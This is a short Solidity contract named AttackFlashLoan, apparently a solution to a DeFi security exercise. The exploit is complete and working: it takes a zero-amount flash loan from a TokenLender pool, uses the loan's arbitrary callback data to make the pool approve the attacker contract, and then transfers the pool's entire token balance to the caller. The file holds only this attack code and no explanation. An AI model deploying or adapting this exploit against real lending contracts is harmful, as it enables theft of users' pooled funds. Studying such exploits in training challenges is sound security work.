// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "contracts/TokenLender.sol";

contract AttackFlashLoan {
    function attack(address _loanPool, address _token, uint256 amount) public {
        IERC20 token = IERC20(_token);
        TokenLender loanPool = TokenLender(_loanPool);
        bytes memory data = abi.encodeCall(
            IERC20.approve,
            (address(this), amount));
        loanPool.flashLoan(0, msg.sender, _token, data);
        token.transferFrom(_loanPool, msg.sender, token.balanceOf(_loanPool));
    }
}
